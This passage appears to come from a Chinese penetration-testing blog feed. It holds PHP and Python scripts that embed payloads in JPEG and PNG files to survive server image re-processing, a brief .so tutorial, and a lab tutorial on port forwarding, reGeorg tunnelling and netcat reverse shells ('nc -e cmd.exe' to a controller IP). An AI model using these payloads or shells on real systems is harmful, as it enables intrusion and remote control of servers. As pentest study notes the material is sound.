&lt;jpg_name.jpg&gt;&#39;);    }    set_error_handler(&quot;custom_error_handler&quot;);    for($pad = 0; $pad &lt; 1024; $pad++) {        $nullbytePayloadSize = $pad;        $dis = new DataInputStream($argv[1]);        $outStream = file_get_contents($argv[1]);        $extraBytes = 0;        $correctImage = TRUE;        if($dis-&gt;readShort() != 0xFFD8) {            die(&#39;Incorrect SOI marker&#39;);        }        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) {            $marker = $dis-&gt;readByte();            $size = $dis-&gt;readShort() - 2;            $dis-&gt;skip($size);            if($marker === 0xDA) {                $startPos = $dis-&gt;seek();                $outStreamTmp =                    substr($outStream, 0, $startPos) .                    $miniPayload .                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) .                    substr($outStream, $startPos);                checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);                if($extraBytes !== 0) {                    while((!$dis-&gt;eof())) {                        if($dis-&gt;readByte() === 0xFF) {                            if($dis-&gt;readByte !== 0x00) {                                break;                            }                        }                    }                    $stopPos = $dis-&gt;seek() - 2;                    $imageStreamSize = $stopPos - $startPos;                    $outStream =                        substr($outStream, 0, $startPos) .                        $miniPayload .                        substr(                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).                                substr($outStream, $startPos, $imageStreamSize),                            0,                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) .                                substr($outStream, $stopPos);                } elseif($correctImage) {                    $outStream = $outStreamTmp;                } else {                    break;                }                if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) {                    die(&#39;Success!&#39;);                } else {                    break;                }            }        }    }    unlink(&#39;payload_&#39;.$argv[1]);    die(&#39;Something\&#39;s wrong&#39;);    function checkImage($filename, $data, $unlink = FALSE) {        global $correctImage;        file_put_contents($filename, $data);        $correctImage = TRUE;        imagecreatefromjpeg($filename);        if($unlink)            unlink($filename);        return $correctImage;    }    function custom_error_handler($errno, $errstr, $errfile, $errline) {        global $extraBytes, $correctImage;        $correctImage = FALSE;        if(preg_match(&#39;/(\d+) extraneous bytes before marker/&#39;, $errstr, $m)) {            if(isset($m[1])) {                $extraBytes = (int)$m[1];            }        }    }    class DataInputStream {        private $binData;        private $order;        private $size;        public function __construct($filename, $order = false, $fromString = false) {            $this-&gt;binData = &#39;&#39;;            $this-&gt;order = $order;            if(!$fromString) {                if(!file_exists($filename) || !is_file($filename))                    die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);                $this-&gt;binData = file_get_contents($filename);            } else {                $this-&gt;binData = $filename;            }            $this-&gt;size = strlen($this-&gt;binData);        }        public function seek() {            return ($this-&gt;size - strlen($this-&gt;binData));        }        public function skip($skip) {            $this-&gt;binData = substr($this-&gt;binData, $skip);        }        public function readByte() {            if($this-&gt;eof()) {                die(&#39;End Of File&#39;);            }            $byte = substr($this-&gt;binData, 0, 1);            $this-&gt;binData = substr($this-&gt;binData, 1);            return ord($byte);        }        public function readShort() {            if(strlen($this-&gt;binData) &lt; 2) {                die(&#39;End Of File&#39;);            }            $short = substr($this-&gt;binData, 0, 2);            $this-&gt;binData = substr($this-&gt;binData, 2);            if($this-&gt;order) {                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);            } else {                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);            }            return $short;        }        public function eof() {            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);        }    }?&gt;</code></pre><p><strong><span id="jump">PLTE数据块写入php代码计算CRC脚本</span></strong>：png_PLTE_crc.py</p><pre><code>import binasciiimport repng = open(r&#39;4.png&#39;,&#39;rb&#39;)a = png.read()png.close()hexstr = binascii.b2a_hex(a)&#39;&#39;&#39; PLTE crc &#39;&#39;&#39;data =  &#39;504c5445&#39;+ re.findall(&#39;504c5445(.*?)49444154&#39;,hexstr)[0]crc = binascii.crc32(data[:-16].decode(&#39;hex&#39;)) &amp; 0xffffffffprint hex(crc)</code></pre><p><strong><span id="jump">大牛写的脚本png.php</span></strong>，直接拿来运行即可</p><pre><code>&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,           0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) {   $r = $p[$y];   $g = $p[$y+1];   $b = $p[$y+2];   $color = imagecolorallocate($img, $r, $g, $b);   imagesetpixel($img, round($y / 3), 0, $color);}imagepng($img,&#39;./1.png&#39;);?&gt;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux-.so文件</title>
      <link href="/Linux-so%E6%96%87%E4%BB%B6/"/>
      <url>/Linux-so%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-各类文件"><a href="#0x00-各类文件" class="headerlink" title="0x00 各类文件"></a>0x00 各类文件</h2><ol><li>.o：目标文件，相当于windows的.obj文件</li><li>.so：共享对象，shared object，用于动态连接，类似.dll</li><li>.a：静态文件，多个.o组成，用于静态连接</li></ol><h2 id="0x01-查看-so文件"><a href="#0x01-查看-so文件" class="headerlink" title="0x01 查看.so文件"></a>0x01 查看.so文件</h2><ol><li>nm -D xx.so</li><li>objdump -Tt xx.so</li></ol><h2 id="0x02-创建-so文件并调用"><a href="#0x02-创建-so文件并调用" class="headerlink" title="0x02 创建.so文件并调用"></a>0x02 创建.so文件并调用</h2><ol><li><p>aaa.c</p><pre><code>void aaa_say(){ printf(&quot;aaa say: I am libaaa.so\n&quot;);}</code></pre></li><li><p>bbb.c</p><pre><code>#include &lt;stdio.h&gt;int main(){ aaa_say(); printf(&quot;bbb say: I am bbb\n&quot;); return 0;}</code></pre></li><li><p>先使用命令：export LD_LIBRARY_PATH=$(pwd) 将当前目录设为gcc搜索.so库的路径，否则是找不到.so库的。</p></li><li><p>编译aaa.c：gcc aaa.c -o libaaa.so -fPIC -shared</p></li><li><p>编译bbb.c：gcc bbb.c -o bbb -laaa -L. </p></li><li><p>执行./bbb</p></li><li><p><img src="/Linux-so%E6%96%87%E4%BB%B6/1.png" alt></p></li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li><a href="https://www.jianshu.com/p/c2fa2a816916" target="_blank" rel="noopener">https://www.jianshu.com/p/c2fa2a816916</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 知识 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>端口转发与隧道技术</title>
      <link href="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/"/>
      <url>/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-隧道技术"><a href="#0x00-隧道技术" class="headerlink" title="0x00 隧道技术"></a>0x00 隧道技术</h2><p><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/1.jpg" alt></p><ol><li><strong>隧道技术</strong>：一种通过使用互联网络的基础设施在网络之间传递数据的方式。使用隧道传递的数据(或负载)可以是不同协议的数据帧或包。隧道协议将这些其他协议的数据帧或包重新封装在新的包头中发送。新的包头提供了路由信息，从而使封装的负载数据能够通过互联网络传递。</li><li>常见隧道技术：</li><li><ul><li>端口转发：<code>lcx、nc、portmap、netsh</code></li></ul></li><li><ul><li>ICMP隧道：<code>icmpsh、ptunnel</code></li></ul></li><li><ul><li>IPv6隧道：<code>6tunnel</code></li></ul></li><li><ul><li>TCP隧道：<code>netsh、Ngrok</code></li></ul></li><li><ul><li>UDP隧道：<code>Udp2raw-Tunnel</code></li></ul></li><li><ul><li>SSH隧道：<code>ssh</code></li></ul></li><li><ul><li>HTTP(S)隧道：<code>reGeorg</code></li></ul></li><li><ul><li>DNS隧道：<code>dnscat2、Iodine</code></li></ul></li><li><ul><li>其他：<a href="https://github.com/ntop/n2n" target="_blank" rel="noopener">n2n</a>、<a href="https://dashboard.ngrok.com/login" target="_blank" rel="noopener">ngrok</a>、socat</li></ul></li></ol><h2 id="0x01-先判断网络互通情况"><a href="#0x01-先判断网络互通情况" class="headerlink" title="0x01 先判断网络互通情况"></a>0x01 <strong>先判断网络互通情况</strong></h2><ol><li>http协议，存在web，<code>curl IP:port</code></li><li>tcp协议，<code>nc IP port、telnet ip port</code></li><li>icmp协议，<code>ping IP/domain、tracert IP/domain</code></li><li>dns协议，nslookup domain/ip dns_ip/domain 或者 nslookup domain/ip </li><li>dig @dns_ip/domain domain/ip 或者 dig domain/ip</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/26.png" alt="不通外网"></li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/27.png" alt="通外网"></li></ol><hr><h2 id="0x10-端口转发"><a href="#0x10-端口转发" class="headerlink" title="0x10 端口转发"></a>0x10 端口转发</h2><ol><li><strong>端口转发（Port forwarding）</strong>：安全壳(SSH) 为网络安全通信使用的一种方法。SSH可以利用端口转发技术来传输其他TCP/IP协议的报文，当使用这种方式时，SSH就为其他服务在客户端和服务器端建立了一条安全的传输管道。</li><li><strong>端口映射</strong>：指将一台主机的内网（LAN）IP地址映射成一个公网（WAN）IP地址，当用户访问提供映射端口主机的某个端口时，服务器将请求转移到本地局域网内部提供这种特定服务的主机；同样，利用端口映射功能还可以将一台外网IP地址机器的多个端口映射到内网不同机器上的不同端口。</li></ol><h3 id="0x11-lcx-exe本机不同端口之间的转发（端口映射）"><a href="#0x11-lcx-exe本机不同端口之间的转发（端口映射）" class="headerlink" title="0x11 lcx.exe本机不同端口之间的转发（端口映射）"></a>0x11 lcx.exe本机不同端口之间的转发（端口映射）</h3><ol><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/1.png" alt></li><li>描述：实现本机不同端口之间的转发，例如将3389端口转发到防火墙允许（或忽略）的端口12345，远程主机访问端口12345实现对3389端口进行访问。</li><li><strong>测试：</strong></li><li>默认访问3389：rdesktop 192.168.100.5:3389</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/2.png" alt></li><li>防火墙禁止3389入站</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/3.png" alt></li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/4.png" alt></li><li>再次访问，访问失败</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/5.png" alt></li><li>lcx本地转发3389-&gt;12345</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/6.png" alt></li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/7.png" alt></li></ol><h3 id="0x12-lcx-exe本地主机端口转发到远程主机端口"><a href="#0x12-lcx-exe本地主机端口转发到远程主机端口" class="headerlink" title="0x12 lcx.exe本地主机端口转发到远程主机端口"></a>0x12 lcx.exe本地主机端口转发到远程主机端口</h3><ol><li>描述：阻止远程主机访问本地3389端口，将本地主机的3389端口转发给远程主机的13389端口，远程主机监听13389端口的数据并转发给23389端口，远程主机访问23389即可访问内网主机的3389端口</li><li><strong>测试：</strong></li><li>访问3389端口，上面已设置阻止访问</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/8.png" alt></li><li>本地主机：lcx.exe -slave remotehost remoteport localhost localport #将本地3389转发到远程主机的13389</li><li><code>lcx.exe -slave 192.168.100.3 13389 127.0.0.1 3389</code></li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/9.png" alt></li><li>远程主机：lcx.exe -listen sourceport targetport #监听13389端口，并转发数据到23389端口</li><li><code>lcx.exe -listen 13389 23389</code></li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/10.png" alt></li></ol><h3 id="0x13-ssh端口转发"><a href="#0x13-ssh端口转发" class="headerlink" title="0x13 ssh端口转发"></a>0x13 ssh端口转发</h3><ol><li><strong>ssh的参数：</strong></li><li>-C：压缩传输</li><li>-f：将SSH传输转入后台执行，不占用当前的shell</li><li>-q：安静模式</li><li>-T：不占用shell</li><li>-N：建立静默连接，不执行远程命令</li><li>-n：把stdin重定向到/dev/null</li><li>-g：允许远程主机连接本地用于转发的端口</li><li>-L：本地端口转发</li><li>-R：远程端口转发</li><li>-D：动态转发</li><li></li><li>HostA、HostB、HostC</li><li><strong>正向代理HostA：</strong>ssh -CfNg -L HostA:portA:HostB:portB username@HostB</li><li>HostA：ssh -L HostA:portA:HostC:portC username@HostB</li><li></li><li><strong>反向代理HostA：</strong>ssh -CfNg -R HostB:portb:HostC:portC username@hostB #访问HostB:portb就相当于访问HostC:portC，条件：修改配置/etc/ssh/sshd_config，GatewayPorts yes</li><li></li><li><strong>动态转发：</strong>ssh -CfNg -D 54321 root@IP</li><li>浏览器设置代理：socks主机：127.0.0.1，端口：54321</li></ol><p><strong>例子一</strong></p><ol><li><strong>主机：192.168.100.1、192.168.100.4</strong></li><li>192.168.100.1访问<a href="http://192.168.100.4/" target="_blank" rel="noopener">http://192.168.100.4/</a></li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/30.png" alt></li><li>192.168.100.1访问本地8888端口</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/31.png" alt></li><li>192.168.100.1执行转发：ssh -L 8888:192.168.100.4:80 <a href="mailto:root@192.168.100.4" target="_blank" rel="noopener">root@192.168.100.4</a></li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/33.png" alt></li><li>192.168.100.1访问本地8888端口</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/32.png" alt></li></ol><p><strong>例子二</strong></p><ol><li><strong>主机：192.168.100.1、192.168.100.4、192.168.100.3</strong></li><li><strong>192.168.100.3网站禁止192.168.100.1访问</strong></li><li>192.168.100.1访问<a href="http://192.168.100.3/" target="_blank" rel="noopener">http://192.168.100.3/</a></li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/34.png" alt></li><li>192.168.100.4访问<a href="http://192.168.100.3/" target="_blank" rel="noopener">http://192.168.100.3/</a></li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/35.png" alt></li><li>192.168.100.1执行转发：ssh -L 7777:192.168.100.3:80 <a href="mailto:root@192.168.100.4" target="_blank" rel="noopener">root@192.168.100.4</a></li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/36.png" alt></li><li>192.168.100.1访问本地7777端口</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/37.png" alt></li></ol><p><strong>例子三</strong></p><ol><li><strong>主机：192.168.100.1、192.168.100.4、192.168.100.3</strong></li><li><strong>同上，192.168.100.3网站禁止192.168.100.1访问</strong></li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/39.png" alt></li><li>192.168.100.1访问192.168.100.4:7777</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/40.png" alt></li><li>192.168.100.1执行命令：ssh -R 192.168.100.4:7777:192.168.100.3:80 <a href="mailto:root@192.168.100.4" target="_blank" rel="noopener">root@192.168.100.4</a></li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/41.png" alt></li></ol><p><strong>例子四</strong></p><ol><li><strong>主机：10.0.0.2（内外网都通）、10.0.0.4（内网）</strong></li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/42.png" alt></li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/43.png" alt></li><li>下载<a href="https://github.com/haad/proxychains" target="_blank" rel="noopener">proxychains</a></li><li>./configure</li><li>sudo make &amp;&amp; make install</li><li>修改配置文件./proxychains/src/proxychains.conf（或默认）</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/45.png" alt></li><li>再试试</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/44.png" alt></li></ol><h3 id="0x14-netsh端口转发"><a href="#0x14-netsh端口转发" class="headerlink" title="0x14 netsh端口转发"></a>0x14 netsh端口转发</h3><ol><li>netsh，windows自带的工具，可以把本地任意一个TCP协议端口重定向到其他端口，或远程端口。</li><li><strong>条件</strong></li><li>2003、xp系统需要安装IPV6(netsh interface ipv6 install)，其他版本直接可以使用。</li><li>网络接口上安装启用IPv6支持，且启用IP Helper服务，不能使用127.0.0.1</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/54.png" alt></li></ol><p><strong>基本语句：</strong></p><ol><li><strong>添加</strong></li><li>netsh interface portproxy add v4tov4 listenaddress=localhost listenport=port connectaddress=ip connectport=port</li><li><strong>删除指定转发配置</strong></li><li>netsh interface portproxy delete v4tov4 listenaddress=ip listenport=port</li><li><strong>查看</strong></li><li>netsh interface portproxy show all</li><li><strong>清除所有转发配置</strong></li><li>netsh interface portproxy reset</li></ol><p><strong>例子：</strong></p><ol><li>将非3389端口的流量重定向到3389端口</li><li>netsh interface portproxy add v4tov4 listenaddress=localip listenport=33389 connectaddress=localip connectport=3389</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/53.png" alt></li><li>不成功则要确保防火墙允许新端口的传入连接。</li><li>netsh advfirewall firewall add rule name=”forwarded_RDP_port=33389” protocol=TCP dir=in localport=33389 action=allow</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/56.png" alt></li><li>再查看转发配置netsh interface portproxy show all</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/55.png" alt></li></ol><h3 id="0x15-MSF端口转发"><a href="#0x15-MSF端口转发" class="headerlink" title="0x15 MSF端口转发"></a>0x15 MSF端口转发</h3><ol><li>portfwd add -l 33389 -p 3389 -r 1.2.3.4 #-l：本地监听端口，-p：目标端口，-r：目标ip</li><li><strong>RDP登录</strong></li><li>rdesktop 127.0.0.1:8888</li><li><strong>其他命令</strong></li><li>portfwd list/delete/flush #列出/删除/清空</li></ol><h3 id="0x16-iptables端口转发"><a href="#0x16-iptables端口转发" class="headerlink" title="0x16 iptables端口转发"></a>0x16 iptables端口转发</h3><ol><li><p>开启转发功能（立即生效，重启失效）：<code>echo 1 &gt;/proc/sys/net/ipv4/ip_forward</code></p></li><li><p><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/76.png" alt></p></li><li><p>主机：windows、10.0.0.2、10.0.0.4</p></li><li><p><strong>iptables添加规则命令：</strong></p></li><li><p><code>iptables -L -t nat --line-number</code> #查看转发规则</p></li><li><p>添加转发规则：</p></li><li><p>iptables -t nat -A PREROUTING -p tcp -d 10.0.0.2 –dport 7777 -j DNAT –to-destination 10.0.0.4:8888 </p></li><li><p>iptables -t nat -A POSTROUTING -p tcp -d 10.0.0.4 –dport 8888 -j SNAT –to-source 10.0.0.2</p></li></ol><hr><h2 id="0x20-NC-Ncat反弹shell"><a href="#0x20-NC-Ncat反弹shell" class="headerlink" title="0x20 NC/Ncat反弹shell"></a>0x20 NC/Ncat反弹shell</h2><ol><li>控制主机：192.168.100.1</li><li>服务器：192.168.100.3</li><li>控制主机监听端口：nc -lvp 8888 </li><li>服务器反弹一个cmd终端：nc -e cmd.exe 192.168.100.1 8888 </li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/25.png" alt></li><li>Linux版：nc IP port -e /bin/bash</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/38.png" alt="nc帮助"></li></ol><hr><h2 id="0x30-Windows之reGeorg与Proxifier"><a href="#0x30-Windows之reGeorg与Proxifier" class="headerlink" title="0x30 Windows之reGeorg与Proxifier"></a>0x30 Windows之<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">reGeorg</a>与Proxifier</h2><ol><li><strong>环境：</strong></li><li>控制主机 192.168.100.1</li><li>服务器 192.168.100.4，192.168.100.3</li><li>proxifier：一款socks5客户端</li><li><a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">reGeorg脚本</a></li><li></li><li>描述：上传服务器可解析的脚本，服务器成功解析后，本地主机监听指定端口通过http/https隧道转发命令到服务器，建立一个socks协议代理进行内网穿透，服务器必须支持aspx/php/jsp等中的一种。</li><li>reGeorg分为客户端与服务端，服务端有php/aspx/jsp/js等多个版本，客户端由Python2编写。</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/11.png" alt></li><li>上传服务器能解析的脚本（这里是tunnel.jsp）</li><li>python reGeorgSocksProxy.py -p 8888 -u <a href="http://192.168.100.3:8080/tunnel.jsp" target="_blank" rel="noopener">http://192.168.100.3:8080/tunnel.jsp</a></li><li>关键字：Georg says, ‘All seems fine’，说明隧道成功建立</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/12.png" alt></li><li>同样，上传脚本后，通过浏览器访问也可验证代理成功</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/13.png" alt></li><li>结合Proxifier代理工具使用</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/14.png" alt></li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/15.png" alt></li><li>Direct：不经过代理，Proxy SOCKS5 127.0.0.1：经过代理</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/16.png" alt></li><li>以mstsc.exe为例，定位到C:\Windows\System32\mstsc.exe，右键——proxifier——proxy socks5 127.0.0.1</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/17.png" alt></li><li>直接选定用户，输入密码登录就行。</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/18.png" alt></li><li>proxifier和cmd就可以看到代理流量交互的信息了</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/19.png" alt></li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/20.png" alt></li><li>php版的tunnel.nosocket.php，失败了</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/21.png" alt></li></ol><hr><h2 id="0x40-Linux之reGeorg-proxychains"><a href="#0x40-Linux之reGeorg-proxychains" class="headerlink" title="0x40 Linux之reGeorg+proxychains"></a>0x40 Linux之reGeorg+proxychains</h2><ol><li><strong>虚拟机环境：</strong></li><li>kali，桥接模式IP：192.168.0.103</li><li>windows server 2008，桥接模式IP：192.168.0.104，仅主机模式IP：192.168.10.4</li><li>windows server 2003，仅主机模式IP：192.168.10.5</li><li><strong>kali：</strong></li><li>git clone <a href="https://github.com/rofl0r/proxychains-ng.git" target="_blank" rel="noopener">https://github.com/rofl0r/proxychains-ng.git</a> proxychains</li><li>git clone <a href="https://github.com/sensepost/reGeorg.git" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg.git</a></li><li>把reGeorg文件夹内的tunnel.jsp上传到windows server 2008（因为是jsp环境）</li><li><strong>访问<a href="http://192.168.0.104:8080/tunnel.jsp" target="_blank" rel="noopener">http://192.168.0.104:8080/tunnel.jsp</a></strong></li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/22.png" alt></li><li><strong>进入proxychains文件夹，执行命令</strong></li><li>./configure</li><li>make &amp;&amp; make install</li><li>vim /etc/proxychains </li><li>修改代理端口（这里设置为6666）</li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/23.png" alt></li><li><strong>进入reGeorg文件夹，执行命令</strong></li><li>python reGeorgSocksProxy.py -p 6666 <a href="http://192.168.0.104:8080/tunnel.jsp" target="_blank" rel="noopener">http://192.168.0.104:8080/tunnel.jsp</a></li><li><strong>进入proxychains文件夹，执行命令</strong></li><li>rdesktop 192.168.10.5  #一直无反应至连接超时</li><li>./proxychains4 rdesktop 192.168.10.5  </li><li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/24.png" alt></li></ol><hr><h2 id="0x50-ICMP隧道"><a href="#0x50-ICMP隧道" class="headerlink" title="0x50 ICMP隧道"></a>0x50 ICMP隧道</h2><ol><li>ICMP：Internet控制报文协议，是TCP/IP协议族中的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通，主机是否可达，路由是否可用等网络本身的消息。这些控制消息不传递用户数据。</li><li>建立ICMP隧道，将TCP/UDP数据封装到ICMP的ping数据包中，从而穿过防火墙。</li></ol><h3 